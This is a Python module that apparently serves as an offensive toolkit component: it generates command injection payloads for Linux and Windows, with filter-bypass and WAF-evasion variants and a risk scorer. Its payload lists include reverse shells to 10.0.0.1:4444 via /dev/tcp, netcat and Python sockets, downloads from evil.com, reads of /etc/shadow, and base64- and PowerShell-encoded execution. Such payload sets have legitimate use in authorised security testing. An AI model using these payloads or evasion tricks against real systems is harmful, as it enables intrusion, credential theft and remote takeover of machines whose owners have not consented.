"""
Command injection payload generator module
Generates command injection payloads for Linux and Windows with bypass techniques
"""

import json
import random
import re
from typing import List, Dict, Any


class CMDiGenerator:
    """Generates command injection payloads with platform-specific techniques"""
    
    def __init__(self):
        """Initialize CMDi generator with payload database"""
        self.payload_database = []
        self._initialize_default_payloads()
    
    def _initialize_default_payloads(self):
        """Initialize with default command injection payloads"""
        self.payload_database = [
            # Basic Linux command injection
            "; id",
            "; whoami",
            "; pwd",
            "; ls -la",
            "; cat /etc/passwd",
            "; ps aux",
            "; uname -a",
            
            # Linux with different separators
            "& id",
            "&& id", 
            "|| id",
            "| id",
            "`id`",
            "$(id)",
            "${id}",
            
            # Windows command injection
            "& whoami",
            "&& whoami",
            "| whoami",
            "; dir",
            "& dir",
            "&& dir",
            "| dir",
            
            # Windows PowerShell
            "; powershell -c whoami",
            "& powershell -c Get-Process",
            "&& powershell -c ls",
            
            # File operations
            "; cat /etc/shadow",
            "; ls /home",
            "& type C:\\windows\\system32\\drivers\\etc\\hosts",
            "&& dir C:\\",
            
            # Network operations
            "; ping -c 1 google.com",
            "& ping google.com",
            "; wget http://evil.com/shell.sh",
            "& curl http://evil.com/malware.exe",
            
            # Advanced techniques
            "; (id)",
            "& (whoami)",
            "; {id}",
            "& {whoami}",
            
            # Encoded payloads
            "; echo 'aWQ=' | base64 -d | sh",
            "& echo aWQ= | base64 -d | cmd",
            
            # Time-based detection
            "; sleep 5",
            "& timeout 5",
            "&& ping -n 5 127.0.0.1"
        ]
    
    def load_payload_database(self, file_path: str):
        """Load payloads from JSON file"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if isinstance(data, list):
                    self.payload_database.extend(data)
                elif isinstance(data, dict) and 'cmdi_payloads' in data:
                    self.payload_database.extend(data['cmdi_payloads'])
        except Exception as e:
            print(f"Warning: Could not load CMDi payload database: {e}")
    
    def generate_payloads(self, count: int = 5, platform: str = 'both',
                         filter_bypass: bool = False, waf_evasion: bool = False) -> List[str]:
        """
        Generate command injection payloads based on platform and requirements
        
        Args:
            count: Number of payloads to generate
            platform: Target platform (linux, windows, both)
            filter_bypass: Include filter bypass techniques
            waf_evasion: Include WAF evasion techniques
            
        Returns:
            List of command injection payloads
        """
        payloads = []
        
        # Platform-specific payload generation
        if platform.lower() == 'linux':
            payloads.extend(self._generate_linux_payloads(count))
        elif platform.lower() == 'windows':
            payloads.extend(self._generate_windows_payloads(count))
        elif platform.lower() == 'both':
            # Mix of both platforms
            linux_count = count // 2
            windows_count = count - linux_count
            payloads.extend(self._generate_linux_payloads(linux_count))
            payloads.extend(self._generate_windows_payloads(windows_count))
        else:
            # Default to mixed payloads
            payloads.extend(random.sample(self.payload_database, 
                                        min(count, len(self.payload_database))))
        
        # Apply filter bypass techniques
        if filter_bypass:
            payloads.extend(self._generate_filter_bypass_payloads(count // 2, platform))
        
        # Apply WAF evasion techniques
        if waf_evasion:
            payloads.extend(self._generate_waf_evasion_payloads(count // 2, platform))
        
        # Remove duplicates and limit count
        unique_payloads = list(set(payloads))
        return unique_payloads[:count]
    
    def _generate_linux_payloads(self, count: int) -> List[str]:
        """Generate Linux-specific command injection payloads"""
        linux_payloads = [
            # Basic Linux commands
            "; id",
            "; whoami",
            "; pwd",
            "; uname -a",
            "; ps aux",
            "; ls -la /",
            "; cat /etc/passwd",
            "; cat /etc/hosts",
            "; cat /proc/version",
            "; env",
            
            # Different separators
            "& id",
            "&& whoami",
            "|| pwd",
            "| id",
            "`whoami`",
            "$(id)",
            "${pwd}",
            
            # File operations
            "; ls -la /home",
            "; cat /etc/shadow",
            "; find / -name '*.conf' 2>/dev/null",
            "; ls -la /var/log",
            "; cat /var/log/auth.log",
            
            # Network operations
            "; ping -c 3 google.com",
            "; wget http://example.com/test.txt",
            "; curl http://example.com",
            "; netstat -tulpn",
            "; ss -tuln",
            
            # System information
            "; cat /proc/cpuinfo",
            "; cat /proc/meminfo",
            "; df -h",
            "; mount",
            "; lsof -i",
            
            # Advanced techniques
            "; (id)",
            "; {whoami}",
            "; id && echo 'success'",
            "; whoami || echo 'failed'",
            
            # Time-based
            "; sleep 5",
            "; ping -c 5 127.0.0.1",
            "; timeout 5s id",
            
            # Reverse shells (for advanced testing)
            "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "; nc -e /bin/bash 10.0.0.1 4444",
            "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        ]
        
        return random.sample(linux_payloads, min(count, len(linux_payloads)))
    
    def _generate_windows_payloads(self, count: int) -> List[str]:
        """Generate Windows-specific command injection payloads"""
        windows_payloads = [
            # Basic Windows commands
            "& whoami",
            "&& whoami",
            "| whoami",
            "; whoami",
            "& dir",
            "&& dir C:\\",
            "| dir",
            "; dir",
            
            # System information
            "& systeminfo",
            "&& ver",
            "| hostname",
            "; ipconfig",
            "& net user",
            "&& net localgroup",
            "| tasklist",
            "; wmic os get name",
            
            # File operations
            "& type C:\\windows\\system32\\drivers\\etc\\hosts",
            "&& dir C:\\Users",
            "| type C:\\boot.ini",
            "; findstr /si password *.txt",
            "& dir C:\\*config*",
            
            # Network operations
            "& ping google.com",
            "&& nslookup google.com",
            "| netstat -an",
            "; arp -a",
            "& ipconfig /all",
            
            # PowerShell execution
            "; powershell -c whoami",
            "& powershell -c Get-Process",
            "&& powershell -c Get-Service",
            "| powershell -c ls",
            "; powershell -c Get-ComputerInfo",
            "& powershell -encodedcommand dwBoAG8AYQBtAGkA",
            
            # Advanced Windows
            "& wmic process list",
            "&& reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
            "| schtasks /query",
            "; net share",
            "& net view",
            
            # Time-based
            "& timeout 5",
            "&& ping -n 5 127.0.0.1",
            "| powershell -c Start-Sleep 5",
            
            # Batch techniques
            "& echo %USERNAME%",
            "&& echo %COMPUTERNAME%",
            "| set",
            "; echo %PATH%",
            
            # Alternative execution
            "& cmd /c whoami",
            "&& cmd.exe /c dir",
            "| command.com /c whoami",
            
            # Registry operations
            "; reg query HKCU",
            "& reg query HKLM\\SYSTEM\\CurrentControlSet\\Services",
            
            # Service enumeration
            "&& sc query",
            "| net start",
            "; wmic service list"
        ]
        
        return random.sample(windows_payloads, min(count, len(windows_payloads)))
    
    def _generate_filter_bypass_payloads(self, count: int, platform: str) -> List[str]:
        """Generate payloads with filter bypass techniques"""
        bypass_payloads = []
        
        if platform.lower() in ['linux', 'both']:
            linux_bypass = [
                # Quote variations
                '; "id"',
                "; 'whoami'",
                '; `id`',
                "; $(whoami)",
                
                # Character substitution
                "; i\\d",
                "; wh\\oami",
                "; p\\wd",
                
                # Environment variables
                "; ${PATH:0:0}id",
                "; $@id",
                "; ${#}whoami",
                
                # Alternative separators
                "%0a id",
                "%0d whoami",
                "%0a%0d id",
                
                # Wildcard usage
                "; /usr/bin/i*",
                "; /bin/wh*",
                "; ls /et*/pass*",
                
                # Command concatenation
                "; echo 'id' | sh",
                "; printf 'whoami' | bash",
                
                # Encoding tricks
                "; echo 'aWQ=' | base64 -d | sh",
                "; echo '\\151\\144' | xargs"
            ]
            bypass_payloads.extend(linux_bypass)
        
        if platform.lower() in ['windows', 'both']:
            windows_bypass = [
                # Quote variations
                '& "whoami"',
                "& 'dir'",
                '&& "systeminfo"',
                
                # Character substitution
                "& wh^oami",
                "&& d^ir",
                "| system^info",
                
                # Environment variables
                "& %COMSPEC:~10,1%hoami",
                "&& %0whoami",
                
                # Alternative separators
                "%0a whoami",
                "%0d dir",
                "%0a%0d whoami",
                
                # PowerShell bypass
                "; powershell -w hidden -c whoami",
                "& powershell -ep bypass -c dir",
                "&& powershell -nop -c systeminfo",
                
                # Batch file techniques
                "& echo whoami > temp.bat && temp.bat",
                "&& for /f %i in ('whoami') do echo %i",
                
                # Alternative execution methods
                "& start /b whoami",
                "&& rundll32.exe advpack.dll,LaunchINFSection cmd.inf,,5,",
                
                # String manipulation
                "& set cmd=whoami && %cmd%",
                "&& set /a x=1 && whoami"
            ]
            bypass_payloads.extend(windows_bypass)
        
        return random.sample(bypass_payloads, min(count, len(bypass_payloads)))
    
    def _generate_waf_evasion_payloads(self, count: int, platform: str) -> List[str]:
        """Generate payloads with WAF evasion techniques"""
        waf_evasion_payloads = []
        
        if platform.lower() in ['linux', 'both']:
            linux_waf_evasion = [
                # Space alternatives
                "; id${IFS}",
                "; whoami$IFS$9",
                "; id<>whoami",
                
                # Tab and newline
                ";\tid",
                ";\nwhoami",
                ";\r\nid",
                
                # Brace expansion
                "; {id,whoami}",
                "; {cat,/etc/passwd}",
                
                # Parameter expansion
                "; ${PATH%%/*}id",
                "; ${HOME:0:1}d",
                
                # Here documents
                "; id<<<''",
                "; whoami<<<$(echo)",
                
                # Process substitution
                "; id<(echo)",
                "; whoami>(cat)",
                
                # Alternative commands
                "; busybox id",
                "; /usr/bin/id",
                "; command id",
                "; exec id",
                
                # Globbing
                "; /bin/i?",
                "; /usr/bin/who*",
                "; ls /et?/pass??",
                
                # Variable indirection
                "; a=id; $a",
                "; cmd=whoami; eval $cmd"
            ]
            waf_evasion_payloads.extend(linux_waf_evasion)
        
        if platform.lower() in ['windows', 'both']:
            windows_waf_evasion = [
                # Alternative spaces
                ";&nbsp;whoami",
                ";&tab;dir",
                
                # Character escaping
                "& who^ami",
                "&& d^i^r",
                "| system^info",
                
                # DOS 8.3 filenames
                "& c:\\progra~1\\intern~1\\iexplore.exe",
                
                # Alternative quotes
                '& "whoami"',
                "& 'dir'",
                '&& `systeminfo`',
                
                # Environment variable expansion
                "& %COMSPEC:~10,1%hoami",
                "&& %windir:~0,1%ir",
                
                # FOR loop obfuscation
                "&& for %i in (whoami) do %i",
                "& for /f %i in ('whoami') do echo %i",
                
                # PowerShell alternatives
                "; powershell -w hidden -nop -c whoami",
                "& powershell -ep bypass -enc dwBoAG8AYQBtAGkA",
                
                # Alternative execution
                "& start /min whoami",
                "&& rundll32 shell32.dll,ShellExec_RunDLL whoami",
                
                # WMI execution
                "& wmic process call create 'whoami'",
                "&& wmic os get name /format:list",
                
                # Batch variable tricks
                "& set x=who&set y=ami&%x%%y%",
                "&& set cmd=dir&call %cmd%"
            ]
            waf_evasion_payloads.extend(windows_waf_evasion)
        
        return random.sample(waf_evasion_payloads, min(count, len(waf_evasion_payloads)))
    
    def validate_payload(self, payload: str) -> Dict[str, Any]:
        """
        Validate command injection payload for basic syntax and structure
        
        Args:
            payload: Command injection payload to validate
            
        Returns:
            Validation result dictionary
        """
        result = {
            'valid': True,
            'errors': [],
            'warnings': [],
            'score': 0
        }
        
        # Basic validation checks
        if not payload.strip():
            result['valid'] = False
            result['errors'].append("Empty payload")
            return result
        
        # Check for basic command injection patterns
        cmdi_patterns = [
            r'[;&|]',
            r'`.*?`',
            r'\$\(.*?\)',
            r'\$\{.*?\}',
            r'&&',
            r'\|\|'
        ]
        
        pattern_matches = 0
        for pattern in cmdi_patterns:
            if re.search(pattern, payload):
                pattern_matches += 1
        
        # Score based on pattern matches
        result['score'] = min(pattern_matches * 20, 100)
        
        # Check for common commands
        common_commands = ['id', 'whoami', 'pwd', 'dir', 'ls', 'cat', 'type', 'ping', 'systeminfo']
        if not any(cmd in payload.lower() for cmd in common_commands):
            result['warnings'].append("No common commands detected")
        
        # Check for dangerous operations
        dangerous_ops = ['rm -rf', 'del /f', 'format', 'shutdown', 'reboot', 'mkfs']
        if any(op in payload.lower() for op in dangerous_ops):
            result['warnings'].append("Contains potentially destructive operations")
        
        # Platform detection
        if any(cmd in payload.lower() for cmd in ['whoami', 'dir', 'systeminfo', 'powershell']):
            result['platform_hint'] = 'windows'
        elif any(cmd in payload.lower() for cmd in ['id', 'pwd', 'ls', 'cat', 'bash']):
            result['platform_hint'] = 'linux'
        else:
            result['platform_hint'] = 'unknown'
        
        return result
    
    def get_payload_info(self, payload: str) -> Dict[str, Any]:
        """
        Get detailed information about a command injection payload
        
        Args:
            payload: Command injection payload to analyze
            
        Returns:
            Dictionary with payload information
        """
        info = {
            'type': 'CMDi',
            'length': len(payload),
            'platform': self._detect_platform(payload),
            'separator': self._detect_separator(payload),
            'commands': self._extract_commands(payload),
            'techniques': self._detect_cmdi_techniques(payload),
            'risk_level': self._assess_cmdi_risk_level(payload)
        }
        
        return info
    
    def _detect_platform(self, payload: str) -> str:
        """Detect the target platform for the payload"""
        payload_lower = payload.lower()
        
        windows_indicators = ['whoami', 'dir', 'systeminfo', 'powershell', 'cmd', 'net user', 'reg query']
        linux_indicators = ['id', 'pwd', 'ls', 'cat', 'bash', 'sh', '/etc/', '/bin/']
        
        windows_count = sum(1 for indicator in windows_indicators if indicator in payload_lower)
        linux_count = sum(1 for indicator in linux_indicators if indicator in payload_lower)
        
        if windows_count > linux_count:
            return 'windows'
        elif linux_count > windows_count:
            return 'linux'
        else:
            return 'cross_platform'
    
    def _detect_separator(self, payload: str) -> List[str]:
        """Detect command separators used in the payload"""
        separators = []
        
        if ';' in payload:
            separators.append('semicolon')
        if '&' in payload and '&&' not in payload:
            separators.append('ampersand')
        if '&&' in payload:
            separators.append('double_ampersand')
        if '||' in payload:
            separators.append('double_pipe')
        if '|' in payload and '||' not in payload:
            separators.append('pipe')
        if '`' in payload:
            separators.append('backtick')
        if '$(' in payload:
            separators.append('command_substitution')
        
        return separators
    
    def _extract_commands(self, payload: str) -> List[str]:
        """Extract individual commands from the payload"""
        # Simple command extraction
        separators = [';', '&', '|', '&&', '||']
        commands = [payload]
        
        for sep in separators:
            new_commands = []
            for cmd in commands:
                new_commands.extend(cmd.split(sep))
            commands = new_commands
        
        # Clean up commands
        cleaned_commands = []
        for cmd in commands:
            cmd = cmd.strip()
            if cmd and not any(sep in cmd for sep in separators):
                cleaned_commands.append(cmd)
        
        return cleaned_commands[:5]  # Limit to first 5 commands
    
    def _detect_cmdi_techniques(self, payload: str) -> List[str]:
        """Detect techniques used in the command injection payload"""
        techniques = []
        
        if re.search(r'["\']', payload):
            techniques.append('quoting')
        
        if re.search(r'\\[a-zA-Z]', payload):
            techniques.append('character_escaping')
        
        if re.search(r'\$\{.*?\}', payload):
            techniques.append('parameter_expansion')
        
        if re.search(r'`.*?`', payload):
            techniques.append('command_substitution')
        
        if re.search(r'%.*?%', payload):
            techniques.append('environment_variables')
        
        if 'base64' in payload.lower():
            techniques.append('encoding')
        
        if any(char in payload for char in ['*', '?', '[', ']']):
            techniques.append('wildcards')
        
        return techniques
    
    def _assess_cmdi_risk_level(self, payload: str) -> str:
        """Assess the risk level of the command injection payload"""
        risk_indicators = 0
        payload_lower = payload.lower()
        
        # Check for destructive operations
        destructive_ops = ['rm -rf', 'del /f', 'format', 'shutdown', 'reboot', 'mkfs', 'dd if=']
        for op in destructive_ops:
            if op in payload_lower:
                risk_indicators += 4
        
        # Check for system modification
        if any(keyword in payload_lower for keyword in ['passwd', 'shadow', 'registry', 'user add']):
            risk_indicators += 3
        
        # Check for network operations
        if any(keyword in payload_lower for keyword in ['wget', 'curl', 'nc -e', 'bash -i']):
            risk_indicators += 3
        
        # Check for information disclosure
        if any(keyword in payload_lower for keyword in ['/etc/passwd', 'systeminfo', 'net user']):
            risk_indicators += 2
        
        # Check for reverse shells
        if any(keyword in payload_lower for keyword in ['bash -i', '/dev/tcp', 'nc -e', 'reverse']):
            risk_indicators += 4
        
        if risk_indicators >= 6:
            return 'critical'
        elif risk_indicators >= 4:
            return 'high'
        elif risk_indicators >= 2:
            return 'medium'
        else:
            return 'low'
